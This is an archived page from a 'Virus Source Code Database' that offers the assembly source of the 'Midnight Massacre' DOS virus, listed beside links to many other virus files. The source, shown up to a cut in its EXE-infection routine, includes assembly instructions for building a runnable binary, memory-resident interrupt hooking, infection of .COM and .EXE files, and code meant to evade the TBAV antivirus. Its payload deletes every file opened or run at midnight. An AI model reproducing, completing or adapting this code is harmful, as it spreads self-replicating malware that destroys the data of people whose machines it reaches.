<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: massacre_asm</title>
<meta name="KEYWORDS" content="massacre.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for massacre.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="madden__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden__asm.php">madden__asm</a><br>
<a href="madden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden_asm.php">madden_asm</a><br>
<a href="maddenb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maddenb_asm.php">maddenb_asm</a><br>
<a href="made_334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made_334_asm.php">made_334_asm</a><br>
<a href="made-334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made-334_asm.php">made-334_asm</a><br>
<a href="made334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made334_asm.php">made334_asm</a><br>
<a href="makestnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/makestnd_asm.php">makestnd_asm</a><br>
<a href="maketorm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maketorm_asm.php">maketorm_asm</a><br>
<a href="malaria_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malaria_asm.php">malaria_asm</a><br>
<a href="malmsey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malmsey_asm.php">malmsey_asm</a><br>
<a href="manvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/manvir_asm.php">manvir_asm</a><br>
<a href="mar_860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar_860_asm.php">mar_860_asm</a><br>
<a href="mar-860__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860__asm.php">mar-860__asm</a><br>
<a href="mar-860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860_asm.php">mar-860_asm</a><br>
<a href="maria_k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria_k_asm.php">maria_k_asm</a><br>
<a href="maria-k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria-k_asm.php">maria-k_asm</a><br>
<a href="marked_x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked_x_asm.php">marked_x_asm</a><br>
<a href="marked-x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked-x_asm.php">marked-x_asm</a><br>
<a href="mark_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark_ii_asm.php">mark_ii_asm</a><br>
<a href="mark-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark-ii_asm.php">mark-ii_asm</a><br>
<a href="maruad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maruad_asm.php">maruad_asm</a><br>
<a href="massacre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/massacre_asm.php">massacre_asm</a><br>
<a href="master_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/master_asm.php">master_asm</a><br>
<a href="mataj13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mataj13_asm.php">mataj13_asm</a><br>
<a href="matt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/matt_asm.php">matt_asm</a><br>
<a href="max_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/max_asm.php">max_asm</a><br>
<a href="mbug1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mbug1_asm.php">mbug1_asm</a><br>
<a href="mcwhale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mcwhale_asm.php">mcwhale_asm</a><br>
<a href="megabug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megabug_asm.php">megabug_asm</a><br>
<a href="megastel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megastel_asm.php">megastel_asm</a><br>
<a href="megatroj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megatroj_asm.php">megatroj_asm</a><br>
<a href="meltdown_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/meltdown_asm.php">meltdown_asm</a><br>
<a href="met_moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met_moon_asm.php">met_moon_asm</a><br>
<a href="met-moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met-moon_asm.php">met-moon_asm</a><br>
<a href="mg1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1a_asm.php">mg1a_asm</a><br>
<a href="mg1b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1b_asm.php">mg1b_asm</a><br>
<a href="mg1c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1c_asm.php">mg1c_asm</a><br>
<a href="mg1d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1d_asm.php">mg1d_asm</a><br>
<a href="mg2_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_____asm.php">mg2_____asm</a><br>
<a href="mg2____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2____asm.php">mg2____asm</a><br>
<a href="mg2___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2___asm.php">mg2___asm</a><br>
<a href="mg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_asm.php">mg2_asm</a><br>
<a href="mg_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg_3_asm.php">mg_3_asm</a><br>
<a href="mg-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg-3_asm.php">mg-3_asm</a><br>
<a href="mg3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3__asm.php">mg3__asm</a><br>
<a href="mg3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3_asm.php">mg3_asm</a><br>
<a href="mgagent1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent1_asm.php">mgagent1_asm</a><br>
<a href="mgagent2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent2_asm.php">mgagent2_asm</a><br>
<a href="mgagent3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent3_asm.php">mgagent3_asm</a><br>
<a href="mg__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg__asm.php">mg__asm</a><br>
<a href="m-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-gen_asm.php">m-gen_asm</a><br>
<a href="mgtest1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest1_asm.php">mgtest1_asm</a><br>
<a href="mgtest2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest2_asm.php">mgtest2_asm</a><br>
<a href="m_hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_hivb_asm.php">m_hivb_asm</a><br>
<a href="m-hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-hivb_asm.php">m-hivb_asm</a><br>
<a href="mich2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich2_asm.php">mich2_asm</a><br>
<a href="michangl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michangl_asm.php">michangl_asm</a><br>
<a href="mich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_asm.php">mich_asm</a><br>
<a href="michel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel2_asm.php">michel2_asm</a><br>
<a href="michel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel_asm.php">michel_asm</a><br>
<a href="michfile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michfile_asm.php">michfile_asm</a><br>
<a href="mich_ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_ld_asm.php">mich_ld_asm</a><br>
<a href="mich-ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich-ld_asm.php">mich-ld_asm</a><br>
<a href="micro29_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/micro29_asm.php">micro29_asm</a><br>
<a href="mike_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_asm.php">mike_asm</a><br>
<a href="mike_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_c.php">mike_c</a><br>
<a href="mikey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mikey_asm.php">mikey_asm</a><br>
<a href="mindles__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindles__asm.php">mindles__asm</a><br>
<a href="mindless_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindless_asm.php">mindless_asm</a><br>
<a href="mindlss_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindlss_asm.php">mindlss_asm</a><br>
<a href="mini_35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_35_asm.php">mini_35_asm</a><br>
<a href="mini-35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-35_asm.php">mini-35_asm</a><br>
<a href="mini40__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40__asm.php">mini40__asm</a><br>
<a href="mini40_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40_asm.php">mini40_asm</a><br>
<a href="mini_42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_42b_asm.php">mini_42b_asm</a><br>
<a href="mini-42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-42b_asm.php">mini-42b_asm</a><br>
<a href="mini_45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_45_asm.php">mini_45_asm</a><br>
<a href="mini_68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_68_asm.php">mini_68_asm</a><br>
<a href="mini-68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-68_asm.php">mini-68_asm</a><br>
<a href="mini_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_asm.php">mini_asm</a><br>
<a href="minimal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/minimal_asm.php">minimal_asm</a><br>
<a href="miniscul_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/miniscul_asm.php">miniscul_asm</a><br>
<a href="misery_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/misery_asm.php">misery_asm</a><br>
<a href="mix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mix1_asm.php">mix1_asm</a><br>
<a href="mkworm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mkworm_asm.php">mkworm_asm</a><br>
<a href="ml_366a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a__asm.php">ml_366a__asm</a><br>
<a href="ml_366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a_asm.php">ml_366a_asm</a><br>
<a href="ml366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml366a_asm.php">ml366a_asm</a><br>
<a href="mlp_1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp_1307_asm.php">mlp_1307_asm</a><br>
<a href="mlp-1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp-1307_asm.php">mlp-1307_asm</a><br>
<a href="mm_122_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mm_122_asm.php">mm_122_asm</a><br>
<a href="mmirdest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirdest_asm.php">mmirdest_asm</a><br>
<a href="mmirfade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirfade_asm.php">mmirfade_asm</a><br>
<a href="mmirlisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirlisa_asm.php">mmirlisa_asm</a><br>
<a href="mmirmoon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirmoon_asm.php">mmirmoon_asm</a><br>
<a href="mmirunkn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirunkn_asm.php">mmirunkn_asm</a><br>
<a href="m_murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph1_asm.php">m_murph1_asm</a><br>
<a href="m-murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph1_asm.php">m-murph1_asm</a><br>
<a href="m_murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph2_asm.php">m_murph2_asm</a><br>
<a href="m-murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph2_asm.php">m-murph2_asm</a><br>
<a href="m-murph__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph__asm.php">m-murph__asm</a><br>
<a href="mojave_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mojave_asm.php">mojave_asm</a><br>
<a href="monami_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monami_asm.php">monami_asm</a><br>
<a href="monkeys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monkeys_asm.php">monkeys_asm</a><br>
<a href="monxla_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monxla_asm.php">monxla_asm</a><br>
<a href="mordor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mordor_asm.php">mordor_asm</a><br>
<a href="morgoth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth__asm.php">morgoth__asm</a><br>
<a href="morgoth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth_asm.php">morgoth_asm</a><br>
<a href="mpc-783_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpc-783_asm.php">mpc-783_asm</a><br>
<a href="mpciguan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpciguan_asm.php">mpciguan_asm</a><br>
<a href="mpcsnort_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpcsnort_asm.php">mpcsnort_asm</a><br>
<a href="mpsopc31_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc31_asm.php">mpsopc31_asm</a><br>
<a href="mpsopc32_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc32_asm.php">mpsopc32_asm</a><br>
<a href="msdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/msdos_asm.php">msdos_asm</a><br>
<a href="mte_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mte_asm.php">mte_asm</a><br>
<a href="m_torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_torma_asm.php">m_torma_asm</a><br>
<a href="m-torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-torma_asm.php">m-torma_asm</a><br>
<a href="muad'di__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'di__asm.php">muad'di__asm</a><br>
<a href="muad_dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad_dib_asm.php">muad_dib_asm</a><br>
<a href="muad'dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'dib_asm.php">muad'dib_asm</a><br>
<a href="mudshark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mudshark_asm.php">mudshark_asm</a><br>
<a href="multiflu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiflu_asm.php">multiflu_asm</a><br>
<a href="multiplx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiplx_asm.php">multiplx_asm</a><br>
<a href="mummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mummy_asm.php">mummy_asm</a><br>
<a href="mumzi!_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mumzi!_asm.php">mumzi!_asm</a><br>
<a href="murphexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphexe_asm.php">murphexe_asm</a><br>
<a href="murphy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphy_asm.php">murphy_asm</a><br>
<a href="musicbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/musicbug_asm.php">musicbug_asm</a><br>
<a href="mutate_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutate_asm.php">mutate_asm</a><br>
<a href="mutatint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutatint_asm.php">mutatint_asm</a><br>
<a href="mut_gard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut_gard_asm.php">mut_gard_asm</a><br>
<a href="mutint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutint_asm.php">mutint_asm</a><br>
<a href="mut-tiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut-tiny_asm.php">mut-tiny_asm</a><br>
<a href="muttiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muttiny_asm.php">muttiny_asm</a><br>
<a href="mystic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic_asm.php">mystic_asm</a><br>
<a href="mystic-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic-b_asm.php">mystic-b_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;****************************************************************************
;*                        Midnight Massacre virus                           *
;*                            by Crypt Keeper                               *
;****************************************************************************

;Version 1.2
;Entry point and check resident bugs fixed.

;Midnight Massacre is based on the Eleet! virus, but with added .COM
;support, bugs in infection process fixed, and new load resident and
;trigger routines.  The Midnight Massacre virus will infect .COM or
;.EXE files as they are opened, executed, or their attributes are
;accessed.  Also, if the system time is 12:00am, the virus will delete
;any file executed or opened for any reason (midnight massacre).
;Midnight Massacre also has a unique memory-resident installation
;routine that will load it into the UMB if a high memory driver is
;present, or 1000h paragraphs down from top of memory, if no HMA
;driver is loaded.  Midnight Massacre will not infect COMMAND.COM

;TASM MASSACRE.ASM /M3
;TLINK MASSACRE.OBJ /t
;The generated .COM file is ready to run with no modifications.

	.model tiny
	.code
	
	org 100h

massacre:                              ;start of virus code

vtop	equ	$                      ;top of virus code block

;Equates --------------------------------------------------------------------

vlength	equ	vbot-vtop              ;virus length in bytes
heapsiz	equ	hbot-heap              ;heap size in bytes
vlres	equ	((vlength+heapsiz+100h)/16)+1 ;virus length in paragraphs
vlpage	equ	(vlength/512)+1        ;virus length in pages
chkfunc	equ	9AC7h                  ;check resident int 21h function
virusid	equ	0000h                  ;virus ID word in exeheader

;----------------------------------------------------------------------------

	db	0BDh                   ;mov bp,
delta	dw	0                      ;delta offset

	lea sp,[bp+(offset(sspace)+64)]  ;set up new stack

	push ds
	push es                        ;save original EXE segments

	cld                            ;clear direction flag

	mov ax,chkfunc
	int 2Fh

	push cs
	pop ds

	cmp ax,chkfunc+1               ;did virus return reply?
	jne install                    ;if not, install resident
	
	jmp return                     ;if so, return to original program

install:
	mov ax,3521h                   ;Get int 21h vector
	int 21h

	mov [bp+offset(i21veco)],bx
	mov [bp+offset(i21vecs)],es

	mov ax,352Fh                   ;Get int 2Fh vector
	int 21h

	mov [bp+offset(i2Fveco)],bx
	mov [bp+offset(i2Fvecs)],es

	mov ax,4300h                   ;get himem.sys installed state
	int 2Fh                        ;multiplex interrupt

	cmp al,80h                     ;80h in al means himem.sys is loaded
	jne get_old_fashioned_way

	mov ax,4310h                   ;get himem.sys entry point adress
	int 2Fh

	mov [bp+offset(himem_o)],bx
	mov [bp+offset(himem_s)],es    ;save entry point for calling

	mov ah,10h                     ;allocate UMB (function 10h)
	mov dx,vlres                   ;paragraphs to request

	call dword ptr [bp+offset(himem_o)] ;call himem.sys
	mov ax,bx                      ;BX will contain segment of memory
	jmp short go_ahead_load        ;continue with load procedure

get_old_fashioned_way:
	int 12h                        ;get total k-bytes of RAM in conv. mem
	
	xor dx,dx
	mov cx,1024
	mul cx
	mov cx,16
	div cx                         ;convert to paragraphs

	sub ax,1000h                   ;put it 1000h paragraphs down from TOM

go_ahead_load:
	mov es,ax                      ;segment of allocated memory arena

	lea si,[bp+offset(massacre)]   ;bp=start of virus code
	mov cx,vlength+heapsiz         ;virus length in bytes+heap data
	mov di,100h

	rep movsb                      ;copy virus code up there

	push es
	pop ds

	mov dx,offset(i2Fvec)          ;new int 21h vector
	mov ax,252Fh                   ;set int 21h vector
	int 21h

	mov dx,offset(i21vec)          ;new int 21h vector
	mov ax,2521h                   ;set int 21h vector
	int 21h

return:	cmp byte ptr [bp+offset(comid)],0  ;is this a .COM file we're from?
	jne return_exe
	
	mov sp,0FFFEh                  ;set old stack pointer

	push cs
	pop ds
	push cs
	pop es

	lea si,[bp+offset(saved)]      ;saved bytes from original .COM
	mov di,100h
	push di                        ;set up for return

	mov cx,compend-cptop           ;size of branch code to replace

	rep movsb                      ;replace branch code

	ret                            ;jump back to top of code segment
return_exe:
	mov ah,51h                     ;Get PSP adress
	int 21h

	add bx,16                      ;Compensate for PSP size

	pop es
	pop ds                         ;Restore original ES and DS from EXE
	
	cli                            ;Clear interrupts for stack change

	mov sp,cs:[bp+offset(old_sp)]
	mov ax,cs:[bp+offset(old_ss)]
	add ax,bx                      ;Find segment for SS
	mov ss,ax                      ;Reset original EXE stack
	
	sti

	add cs:[bp+offset(old_cs)],bx  ;Find segment for CS

	jmp dword ptr cs:[bp+offset(old_ip)] ;Far jump to original EXE code

;----------------------------------------------------------------------------

i2Fvec:	cmp ax,chkfunc                 ;check resident function?
	je ret_reply                   ;if so, return a reply

	jmp dword ptr cs:i2Fveco
ret_reply:
	inc ax
	iret                           ;return with reply
	
;----------------------------------------------------------------------------

move_pointer_beginning:
	xor dx,dx
	xor cx,cx

	mov ax,4200h                   ;move file pointer to beginning of file
	jmp short function             ;execute DOS function call

move_pointer_end:
	xor cx,cx
	xor dx,dx                      ;move pointer 0 bytes
	
	mov ax,4202h                   ;move pointer to end of file
	;goes on to function procedure below
		
function:
	pushf
	call dword ptr cs:i21veco      ;simulate int 21h call
	ret

;Data -----------------------------------------------------------------------

message	db	'[MIDNIGHT MASSACRE] V1.2 by Crypt Keeper'

old_sp	dw	0
old_ss	dw	0FFF0h                 ;Old SS:SP
old_ip	dw	0
old_cs	dw	0FFF0h                 ;Old CS:IP

exeext	db	'EXE'
comext	db	'COM'                  ;Extensions to look for

comid	db	0                      ;set to 0 if .COM file by loader

cptop	equ	$                      ;start of COM file branch program
comproc:
	nop
	db	0BBh                   ;MOV BX,
voffset	dw	0                      ;virus jump offset
	push bx
	ret
compend	equ	$                      ;End of COM file branch program

saved	db	0CDh,20h               ;for proper return on gen #1 file
	db	(compend-cptop)-2 dup (0) ;saved .COM file bytes

;----------------------------------------------------------------------------

i21vec:	nop

	xchg ax,dx                     ;load into another register to fool
	                               ;TBAV's interception check flag

	cmp dx,4B00h                   ;load and execute program?
	je vtrigger

	cmp dx,4B01h                   ;load program?
	je vtrigger
	
	cmp dh,3Dh                     ;open file with handle?
	je vtrigger

	cmp dx,4301h                   ;set file attributes?
	je vtrigger

	cmp dx,4300h                   ;get file attributes?
	je vtrigger

	xchg ax,dx

	jmp dword ptr cs:i21veco
vtrigger:
	xchg ax,dx

	push es
	push si
	push di
	push ax
	push bx
	push cx
	push ds
	push dx

	mov ah,2Ch                     ;Get time
	int 21h

	pop dx
	push dx                        ;get old DX off stack

	cmp cx,0                       ;midnight?
	jne no_massacre                ;if not, skip the massacre

	mov ah,41h                     ;delete file
	int 21h
		
	jmp short exitvec              ;exit from interrupt

no_massacre:
	push ds
	pop es
	mov di,dx

	push cs
	pop ds

	cld                            ;clear direction flag
	mov cx,128                     ;maximum number of chars in a filename
	mov al,'.'                     ;search for extension seperator

	repne scasb                    ;find file extension
	
	cmp cx,0                       ;no extension found?
	je exitvec

	mov bx,di

upcase:	cmp byte ptr es:[di],97
	jb skip_change
	cmp byte ptr es:[di],122
	ja skip_change                 ;non-letters are not affected
	and byte ptr es:[di],5Fh       ;make character upper case
skip_change:
	inc di
	loop upcase

	mov di,bx

	mov si,offset(exeext)          ;extension to compare to
	mov cx,3                       ;3 bytes to compare

	repe cmpsb                     ;is the extension 'EXE'?

	cmp cx,0                       ;were they equal?
	je infect_exe                  ;if so, infect the .EXE file

	mov di,bx

	mov si,offset(comext)          ;extension to compare to
	mov cx,3                       ;3 bytes to compare

	repe cmpsb                     ;is the extension 'COM'?

	cmp cx,0                       ;were they equal?
	jne exitvec                    ;if not, terminate
	
	sub bx,3
	cmp word ptr es:[bx],'DN'      ;end with 'ND'?
	je exitvec

	jmp infect_com                 ;infect the .COM file
exitvec:
	pop dx
	pop ds
	pop cx
	pop bx
	pop ax
	pop di
	pop si
	pop es

	jmp dword ptr cs:i21veco       ;execute rest of interrupt chain

infect_exe:	
	pop dx
	push dx                        ;get adress of filename off stack
	call prepare_infect            ;prepare to infect

	mov cx,28                      ;size of EXE header + extra stuff
	mov dx,offset(exeheader)       ;EXE header data space

	mov ah,3Fh                     ;read file or device
	int 21h

	mov ax,exesign
	xor ax,0ABCDh                  ;kill TBAV's check exe/com flag
	cmp ax,0E697h
	je exe_ok
	cmp ax,0F180h
	je exe_ok                      ;if EXE ID field is ok, go ahead

	jmp endinfection               ;If not good EXE, end infection

exe_ok:	cmp idword,virusid             ;virus already infected?
	jne not_infected               ;if not, proceed

	jmp endinfection

not_infected:
	les si,dword ptr ds:initip     ;get CS:IP from EXE header
	mov old_cs,es
	mov old_ip,si

	les si,dword ptr ds:initss     ;get SS:SP (reversed)
	mov old_ss,si
	mov old_sp,es

